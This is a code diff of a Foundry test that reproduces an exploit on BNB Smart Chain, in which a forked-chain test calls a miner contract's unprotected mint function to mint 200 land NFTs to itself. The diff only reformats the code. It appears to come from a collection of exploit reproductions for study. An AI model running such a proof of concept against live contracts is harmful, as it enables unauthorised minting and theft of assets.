@@ -23,16 +23,13 @@ contract ContractTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 28208132);
+        cheats.createSelectFork("bsc", 28_208_132);
         cheats.label(address(landNFT), "landNFT");
         cheats.label(address(minerContract), "Miner");
     }
 
     function testExploit() public {
-        emit log_named_uint(
-            "Attacker amount of NFT land before mint",
-            landNFT.balanceOf(address(this))
-        );
+        emit log_named_uint("Attacker amount of NFT land before mint", landNFT.balanceOf(address(this)));
 
         address[] memory to = new address[](1);
         to[0] = address(this);
@@ -40,18 +37,10 @@ contract ContractTest is Test {
         amount[0] = 200;
         minerContract.mint(to, amount);
 
-        emit log_named_uint(
-            "Attacker amount of NFT land after mint",
-            landNFT.balanceOf(address(this))
-        );
+        emit log_named_uint("Attacker amount of NFT land after mint", landNFT.balanceOf(address(this)));
     }
 
-    function onERC721Received(
-        address,
-        address,
-        uint256,
-        bytes memory
-    ) external returns (bytes4) {
+    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
         return this.onERC721Received.selector;
     }
 }
